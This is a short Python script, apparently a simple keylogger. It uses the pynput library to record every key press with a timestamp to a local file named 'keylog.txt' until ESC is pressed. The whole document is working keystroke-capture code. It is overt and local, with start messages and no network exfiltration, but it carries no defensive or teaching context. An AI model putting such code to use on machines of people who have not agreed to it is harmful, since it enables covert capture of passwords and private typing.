from pynput import keyboard
import datetime
import os

log_file = "keylog.txt"
keys_buffer = []

def on_press(key):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    
    try:
        key_char = key.char
    except AttributeError:
        key_char = f"[{key}]"
    
    keys_buffer.append(f"{timestamp} - {key_char}")
    
    with open(log_file, "a") as f:
        f.write(f"{timestamp} - {key_char}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        print ("\n[*] Stopping keylogger...")
        return False
    
def start_keylogger():
    print("[*] Keylogger started. press ESC to stop.")
    print(f"[*] Logging to: {log_file}\n")

    with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()